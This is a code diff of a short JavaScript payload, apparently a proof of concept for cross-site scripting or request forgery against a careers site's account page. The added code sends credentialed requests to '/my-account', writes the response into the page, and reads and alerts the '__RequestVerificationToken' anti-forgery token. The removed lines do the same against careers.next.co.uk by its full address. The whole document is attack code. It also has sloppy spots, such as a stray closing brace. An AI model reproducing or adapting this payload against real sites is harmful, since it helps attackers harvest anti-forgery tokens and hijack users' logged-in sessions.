@@ -1,5 +1,23 @@
-var req = new XMLHttpRequest();
-req.open('get','https://careers.next.co.uk/my-account/',true);
-req.send();
-var token = document.getElementsByName('__RequestVerificationToken')[0].value;
-alert(token)};
+var req1 = new XMLHttpRequest();
+req1.onload = req1Listener;
+req1.open('get', '/my-account', true);
+req1.withCredentials = true;
+req1.send('{}');
+function req1Listener() {
+    document.write(this.responseText);
+};
+
+req1.onreadystatechange = function()
+{
+    if (req1.readyState == 4 && req1.status == 200)
+    {
+        var req2 = new XMLHttpRequest();
+        req2.onload = handleResponse;
+        req2.open('get','/my-account',true);
+        req2.send();
+        function handleResponse() {
+            var token = document.getElementsByTagName("input")['__RequestVerificationToken'].value;
+            alert(token);
+        };
+    }
+}
